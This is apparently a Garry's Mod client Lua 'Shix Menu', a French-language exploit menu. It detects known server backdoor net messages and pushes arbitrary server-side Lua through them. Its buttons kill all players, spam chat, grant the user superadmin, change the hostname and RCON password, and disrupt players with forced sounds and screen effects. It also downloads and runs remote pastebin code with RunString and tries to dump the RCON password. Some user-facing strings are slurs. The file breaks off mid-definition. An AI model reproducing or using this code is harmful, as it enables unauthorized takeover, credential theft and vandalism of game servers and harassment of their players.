local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);
local toxic = {}
local iZNX = {}
iZNX.memory = {}
function ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
function IsMessagePooled( netmessage )
status, error = pcall(net.Start,netmessage)
return status
end
local shixrpcrew = ""
if ValidNetString( "Sandbox_ArmDupe" ) then
shixrpcrew = "Sandbox_ArmDupe"
else
if ValidNetString( "Fix_Keypads" ) then
shixrpcrew = "Fix_Keypads"
else
if ValidNetString( "Remove_Exploiters" ) then
shixrpcrew = "Remove_Exploiters"
else
if ValidNetString( "noclipcloakaesp_chat_text" ) then
shixrpcrew = "noclipcloakaesp_chat_text"
else
if ValidNetString( "_Defqon" ) then
shixrpcrew = "_Defqon"
else
if ValidNetString( "_CAC_ReadMemory" ) then
shixrpcrew = "_CAC_ReadMemory"
else
if ValidNetString( "nostrip" ) then
shixrpcrew = "nostrip"
else
if ValidNetString( "LickMeOut" ) then
shixrpcrew = "LickMeOut"
else
if ValidNetString( "MoonMan" ) then
shixrpcrew = "MoonMan"
else
if ValidNetString( "ULXQUERY2" ) then
shixrpcrew = "ULXQUERY2"
else
if ValidNetString( "Im_SOCool" ) then
shixrpcrew = "Im_SOCool"
if ValidNetString( "abdg12" ) then
shixrpcrew = "abdg12"
end
end
end
end
end
end
end
end
end
end
end
end
MsgC (Color(0, 255, 0), [[
   _____ _     _        __  __                  
  / ____| |   (_)      |  \/  |                 
 | (___ | |__  ___  __ | \  / | ___ _ __  _   _ 
  \___ \| '_ \| \ \/ / | |\/| |/ _ \ '_ \| | | |
  ____) | | | | |>  <  | |  | |  __/ | | | |_| |
 |_____/|_| |_|_/_/\_\ |_|  |_|\___|_| |_|\__,_|
                                                
                                   
                                                                       
																	   
███████████████████████
████░█████████████░████
███░██▀▀▀█████▀▀▀██░███
███░██░░░██▀██░░░██░███
███▀░█▀███▄▄▄███▀█░▀███
███░██▄░▄░▄░▄░▄░▄██░███
███▀░░▀▀▄▄▄▄▄▄▄▀▀░░▀███

Bienvenue sur le Shix Menu destructeur de serveur !	

Ce menu a été  créé par Enzo Toquoit														   
]])
function Backdoordetect()
if IsMessagePooled( shixrpcrew ) then return "La backdoor shix est DETECTER sur se serveur !"
else return "La backdoor shix n'est PAS DETECTER !"
end
end
concommand.Add( "sh_menu", function( )
local Menu = vgui.Create("DFrame")
Menu:SetSize(850,850)
Menu:SetTitle("")
Menu:Center()
Menu:MakePopup()
Menu.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255), math.random(0,255), math.random(0,255), 170))
surface.DrawRect( 0,0, w, h ) 
surface.SetDrawColor( Color(0,0,20, 240) ) 
surface.DrawRect( 0+18,0+19, w-4,h-4 )
surface.SetTextColor(255,255,255)
end

local tttpanel = vgui.Create("DPanel", Menu)
tttpanel:SetSize(750, 750)
tttpanel:SetPos(55, 70)
tttpanel.Paint = function( panel, w, h )
draw.RoundedBox( 8, 0, 0, tttpanel:GetWide(), tttpanel:GetTall(), Color( 0, 0, 0, 150 ) )
end

local label = vgui.Create("DLabel", Menu)
label:SetSize(500,50)
label:SetPos(290, 25)
label:SetText("Shix Menu - 1.0")
label:SetFont( "DermaLarge" )

local label2 = vgui.Create("DLabel", Menu)
label2:SetSize( 200, 20 )
label2:SetPos( 0, 0 )
label2:SetText( "ShixMenu by Enzo Toquoit." )

local backdoordetected = vgui.Create( "DLabel" )
backdoordetected:SetPos( 600, 25 ) 
backdoordetected:SetParent( Menu )
backdoordetected:SetSize( 450, 25 )
backdoordetected:SetText( Backdoordetect() )

function Htx_StringRequest( strTitle, strText, strDefaultText, fnEnter, fnCancel, strButtonText, strButtonCancelText )
end
local PlayerList1Label = vgui.Create( "DLabel" )
PlayerList1Label:SetPos( 600, 25 ) 
PlayerList1Label:SetParent( Menu )
PlayerList1Label:SetSize( 450, 60 )
PlayerList1Label:SetText( "Backdoor Active :"..shixrpcrew.."," )
PlayerList1Label:SetTextColor( Color(math.random(0,255),
math.random(0,255),
math.random(0,255),
255))
local ps = vgui.Create( "DPropertySheet", Menu)
	ps:SetPos( 16, 20 )
	ps:SetSize( 850, 850 )
	ps:SetFadeTime( 0 )
	ps.Paint = function() -- The paint function
    --draw.RoundedBox( 6, 0, 0, w - 16, h - 36, Color( 600, 600, 600, 75 ) )
end

	local list1 = vgui.Create( "DPanelList", ps )
	list1:SetPos( 4, 4 )
	list1:SetSize( 850, 850)
	list1:EnableVerticalScrollbar( true )
	list1:EnableHorizontal( true )
	list1:SetPadding( 4 )
	list1:SetSpacing( 4 )
	function list1:Paint()
	--draw.RoundedBox( 8, 0, 0, DermaFrame:GetWide(), DermaFrame:GetTall(), Color( 600, 0, 0, 600 ) )
	end
	
	local tab1content = vgui.Create("DLabel", list1)
	tab1content:SetPos( 6, 6 )
	tab1content:SetSize( 200, 20 )
	tab1content:SetText( "" )
	list1:AddItem(table1content)
	
	ps:AddSheet( "Exploits", list1, "icon16/picture_edit.png", true, false, "" )
	
	local list2 = vgui.Create( "DPanelList", ps )
	list2:SetPos( 4, 4 )
	list2:SetSize( 850, 850)
	list2:EnableVerticalScrollbar( true )
	list2:EnableHorizontal( true )
	list2:SetPadding( 4 )
	list2:SetSpacing( 4 )
	function list2:Paint()
	--draw.RoundedBox( 8, 0, 0, DermaFrame:GetWide(), DermaFrame:GetTall(), Color( 600, 0, 0, 600 ) )
	end
	
	local tab2content = vgui.Create("DLabel", list2)
	tab2content:SetPos( 6, 6 )
	tab2content:SetSize( 200, 20 )
	tab2content:SetText( "" )
	list2:AddItem(table2content)
	
	ps:AddSheet( "Soundboard", list2, "icon16/music.png", true, false, "" )
	
		local list3 = vgui.Create( "DPanelList", ps )
	list3:SetPos( 4, 4 )
	list3:SetSize( 850, 850)
	list3:EnableVerticalScrollbar( true )
	list3:EnableHorizontal( true )
	list3:SetPadding( 4 )
	list3:SetSpacing( 4 )
	function list3:Paint()
	--draw.RoundedBox( 8, 0, 0, DermaFrame:GetWide(), DermaFrame:GetTall(), Color( 600, 0, 0, 600 ) )
	end
	
	local tab3content = vgui.Create("DLabel", list3)
	tab3content:SetPos( 6, 6 )
	tab3content:SetSize( 200, 20 )
	tab3content:SetText( "" )
	list3:AddItem(table2content)
	
	ps:AddSheet( "Action Spécial", list3, "icon16/picture_edit.png", true, false, "" )

local Macro = vgui.Create( "DButton" )
Macro:SetParent( list1 )  
Macro:SetPos( 650, 70 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Tuer tout le monde" )
Macro.Paint = function(panel, w, h)
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
Macro.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local Button1 = vgui.Create("DButton", list1 )
Button1:SetSize( 110, 25 )
Button1:SetPos( 650, 110 )
Button1:SetText( "SPAM DU CHAT" )
Button1:SetTextColor(Color(255, 255, 255, 255))
Button1.Paint = function(panel, w, h)
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
Button1.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "timer.Create( \"adminsgonnahate\", 0.01, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Server Hacked By Enzo Toquoit\")]]) end)")
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton5 = vgui.Create("DButton", list1 )
ExploitButton5:SetSize( 110, 25 )
ExploitButton5:SetPos( 650, 150 )
ExploitButton5:SetText( "STOP SPAM" )
ExploitButton5:SetTextColor(Color(255, 255, 255, 255))
ExploitButton5.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton5.DoClick = function()
net.Start(shixrpcrew)
net.WriteString("timer.Stop( \"adminsgonnahate\")")
net.WriteBit(1)
net.SendToServer()
end
local superadminbutton = vgui.Create("DButton", list1 )
superadminbutton:SetSize( 110, 25 )
superadminbutton:SetPos( 650, 190 )
superadminbutton:SetText( "Se mettre superadmin" )
superadminbutton:SetTextColor(Color(255, 255, 255, 255))
superadminbutton.Paint = function(panel, w, h)
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 
end
superadminbutton.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( [[

            local id = ]] .. LocalPlayer():UserID() .. [[

            RunConsoleCommand( 'ulx', 'adduser', tostring( Player( id ):Nick() ), 'superadmin' )

            Player( id ):SetUserGroup( "superadmin" )

        ]] )
net.WriteBit(1)
net.SendToServer()
end
local exploitbuttonspam = vgui.Create("DButton", list1 )
exploitbuttonspam:SetSize( 110, 25 )
exploitbuttonspam:SetPos( 650, 230 )
exploitbuttonspam:SetText( "Super Spam Visuel [FRERI]" )
exploitbuttonspam:SetTextColor(Color(255, 255, 255, 255))
exploitbuttonspam.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
exploitbuttonspam.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/JZpkvvuf\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end


local ExploitButton8 = vgui.Create("DButton", list3 )
ExploitButton8:SetSize( 590, 20 )
ExploitButton8:SetPos( 40, 164 )
ExploitButton8:SetText( "[ON] Faire tourner les joueurs" )
ExploitButton8:SetTextColor(Color(255, 255, 255, 255))
ExploitButton8.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton8.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"+right\") end" )
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton9 = vgui.Create("DButton", list3 )
ExploitButton9:SetSize( 590, 20 )
ExploitButton9:SetPos( 40, 186 )
ExploitButton9:SetText( "[OFF] Faire tourner les joueurs" )
ExploitButton9:SetTextColor(Color(255, 255, 255, 255))
ExploitButton9.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton9.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"-right\") end" )
net.WriteBit(1)
net.SendToServer()
end
ExploitButton8.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"+right\") end" )
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton10 = vgui.Create("DButton", list3 )
ExploitButton10:SetSize( 590, 20 )
ExploitButton10:SetPos( 40, 208 )
ExploitButton10:SetText( "[ON] Faire avancer les joueurs" )
ExploitButton10:SetTextColor(Color(255, 255, 255, 255))
ExploitButton10.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton10.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"+forward\") end" )
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton11 = vgui.Create("DButton", list3 )
ExploitButton11:SetSize( 590, 20 )
ExploitButton11:SetPos( 40, 230 )
ExploitButton11:SetText( "[OFF] Faire avancer les joueurs" )
ExploitButton11:SetTextColor(Color(255, 255, 255, 255))
ExploitButton11.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton11.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"-forward\") end" )
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton12 = vgui.Create("DButton", list3 )
ExploitButton12:SetSize( 590, 20 )
ExploitButton12:SetPos( 40, 252 )
ExploitButton12:SetText( "[ON] Faire reculer les joueurs" )
ExploitButton12:SetTextColor(Color(255, 255, 255, 255))
ExploitButton12.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton12.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"+back\") end" )
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton13 = vgui.Create("DButton", list3 )
ExploitButton13:SetSize( 590, 20 )
ExploitButton13:SetPos( 40, 274 )
ExploitButton13:SetText( "[OFF] Faire reculer les joueurs" )
ExploitButton13:SetTextColor(Color(255, 255, 255, 255))
ExploitButton13.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton13.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"-back\") end" )
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton14 = vgui.Create("DButton", list3 )
ExploitButton14:SetSize( 590, 20 )
ExploitButton14:SetPos( 40, 296 )
ExploitButton14:SetText( "[ON] Faire attaquer les joueurs" )
ExploitButton14:SetTextColor(Color(255, 255, 255, 255))
ExploitButton14.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton14.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"+attack\") end" )
net.WriteBit(1)
net.SendToServer()
end
local ExploitButton15 = vgui.Create("DButton", list3 )
ExploitButton15:SetSize( 590, 20 )
ExploitButton15:SetPos( 40, 318 )
ExploitButton15:SetText( "[OFF] Faire attaquer les joueurs" )
ExploitButton15:SetTextColor(Color(255, 255, 255, 255))
ExploitButton15.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
ExploitButton15.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:ConCommand(\"-attack\") end" )
net.WriteBit(1)
net.SendToServer()
end

net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," Voici la sérrure de toutes les portes ;D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Aucun rcon_password sur le serveur :/" )
end )

net.Start(shixrpcrew)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/hc5W9Sse\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if iZNX.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password pas trouvé, veuillez réessayer ^^" )
end
end)

local commandnethtx16 = vgui.Create("DButton", list1)
commandnethtx16:SetSize( 110, 25 )
commandnethtx16:SetPos( 650, 270 )
commandnethtx16:SetText("DONT TOUCH")
commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
commandnethtx16.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
commandnethtx16.DoClick = function()
net.Start(shixrpcrew)
net.WriteString(  )
net.WriteBit(1)
net.SendToServer()
end

local devbutton1 = vgui.Create("DButton", list1)
devbutton1:SetSize( 110, 25 )
devbutton1:SetPos( 650, 310 )
devbutton1:SetText("Activer le mode PLS")
devbutton1:SetTextColor(Color(255, 255, 255, 255))
devbutton1.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
devbutton1.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(1920,1080) hud:SetPos(0,0) hud:OpenURL(\"https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg\")]]) v:SendLua([[sound.PlayURL( 'http://www.underdone.org/leak/underdone/blue.mp3', 'mono', function( s ) s:Play() end )]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]])" )
net.WriteBit(1)
net.SendToServer()
end
local devbutton2 = vgui.Create("DButton", list1)
devbutton2:SetSize( 110, 25 )
devbutton2:SetPos( 650, 350 )
devbutton2:SetText("10000€‚ toute les 0.1sec")
devbutton2:SetTextColor(Color(255, 255, 255, 255))
devbutton2.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
devbutton2.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10000\", 0.1, 0, function() v:addMoney(10000) end) end" )
net.WriteBit(1)
net.SendToServer()
end
local devbutton3 = vgui.Create("DButton", list1)
devbutton3:SetSize( 110, 25 )
devbutton3:SetPos( 650, 390 )
devbutton3:SetText("Niquer les datas du serveurs")
devbutton3:SetTextColor(Color(255, 255, 255, 255))
devbutton3.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
devbutton3.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "http.Fetch(\'https://pastebin.com/raw/2Ka9YA6J\',function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end

local devbutton3 = vgui.Create("DButton", list1)
devbutton3:SetSize( 110, 25 )
devbutton3:SetPos( 650, 430 )
devbutton3:SetText("Misquine violente")
devbutton3:SetTextColor(Color(255, 255, 255, 255))
devbutton3.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
devbutton3.DoClick = function()
local lel = [[
RunConsoleCommand( "hostname", "HACKED BY ShixRpCrew")
RunConsoleCommand( "sv_loadingurl", "https://lh3.googleusercontent.com/rJfxrt7eZdrzfdPOhO-H5hf99ayj_6iK9hwMz_98f0eLhs5tKcaExC3vBHUbDEgOOlQES-U=s151" )
RunConsoleCommand( "rcon_password", "shixrp" )
]]
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "ShixRpCrew", "] ", Color( 255, 255, 255 ), "Nom du serveur changé : SERVER HACKED BY ENZO TQOUOIT " )
net.Start(shixrpcrew)
net.WriteString( lel )
net.WriteBit(1)
net.SendToServer()
end

local bonjouratouslesamis = vgui.Create("DButton", list2)
bonjouratouslesamis:SetSize( 110, 25 )
bonjouratouslesamis:SetPos( 35, 155 )
bonjouratouslesamis:SetText("LA PHOTO FILS DE PUTE !!!")
bonjouratouslesamis:SetTextColor(Color(255, 255, 255, 255))
bonjouratouslesamis.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
bonjouratouslesamis.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://hackerrpforum.mtxserv.fr/TousLesSounds/Sound5/LA%20PHOTO%20FILS%20DE%20PUTE%20,%20LA%20PHOTO%20!!%20(%2018-25%20Vocaroo).mp3', 'mono', function( s ) s:Play() end )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end

local SoundButton5 = vgui.Create("DButton", list2 )
SoundButton5:SetSize( 110, 25 )
SoundButton5:SetPos( 35, 36 )
SoundButton5:SetText( "Bonjour a tous les amis" )
SoundButton5:SetTextColor(Color(255, 255, 255, 255))
SoundButton5.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
SoundButton5.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'https://supronrp.fr/secret/03.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end
local SoundButton4 = vgui.Create("DButton", list2 )
SoundButton4:SetSize( 110, 25 )
SoundButton4:SetPos( 35, 76 )
SoundButton4:SetText( "Tk chante" )
SoundButton4:SetTextColor(Color(255, 255, 255, 255))
SoundButton4.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
SoundButton4.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://hackerrpforum.mtxserv.fr/mp32/Tk.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end
local SoundButton4 = vgui.Create("DButton", list2 )
SoundButton4:SetSize( 110, 25 )
SoundButton4:SetPos( 35, 115 )
SoundButton4:SetText( "Beliver" )
SoundButton4:SetTextColor(Color(255, 255, 255, 255))
SoundButton4.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
SoundButton4.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'https://supronrp.fr/DragonMenu/01.wav', 'mono', function( s ) s:Play() end )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end

local SoundButton4 = vgui.Create("DButton", list1 )
SoundButton4:SetSize( 110, 25 )
SoundButton4:SetPos( 650, 510 )
SoundButton4:SetText( "Tout les nom rp : Enzo Toquoit" )
SoundButton4:SetTextColor(Color(255, 255, 255, 255))
SoundButton4.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
SoundButton4.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:setDarkRPVar( \"rpname\",  \"Enzo Toquoit\" ) end" )
net.WriteBit(1)
net.SendToServer()
end

local SoundButton4 = vgui.Create("DButton", list1 )
SoundButton4:SetSize( 110, 25 )
SoundButton4:SetPos( 650, 550 )
SoundButton4:SetText( "Say @@insulte@@" )
SoundButton4:SetTextColor(Color(255, 255, 255, 255))
SoundButton4.Paint = function( panel, w, h )
surface.SetDrawColor( Color(math.random(0,255),
              math.random(0,255),
              math.random(0,255),
              255))

		surface.DrawRect( 0,0, w, h ) 

		surface.SetDrawColor( Color(0,0,0) ) 

		surface.DrawRect( 0+2,0+2, w-4,h-4 ) 

		surface.SetTextColor(255,255,255) 

end
SoundButton4.DoClick = function()
net.Start(shixrpcrew)
net.WriteString( "for k,v in pairs(player.GetAll()) do ply:ConCommand( say /ooc NIKER VOS MËRES BANDE DE BATARD ) end" )
net.WriteBit(1)
net.SendToServer()
end



local Entry = vgui.Create( "DTextEntry" )
Entry:SetParent(list1)
Entry:SetPos( 62, 660 )
Entry:SetSize( 230, 90 )
Entry:SetText( "" )

local RCON = vgui.Create("DButton", list1 )
RCON:SetSize( 110, 25 )
RCON:SetPos( 180, 630 )
RCON:SetText("RCON Command")
RCON:SetTextColor(Color(255, 255, 255, 255))
RCON.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
end

RCON.DoClick = function()
    local GetEntry = Entry:GetValue()
        net.Start(shixrpcrew)
        net.WriteString( GetEntry )
        net.WriteBit (false)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "ShixMenu", "] ", Color( 255, 255, 255 ), "RCON Command sent." )
end

local GLUA = vgui.Create("DButton", list1 )
GLUA:SetSize( 110, 25 )
GLUA:SetPos( 65, 630 )
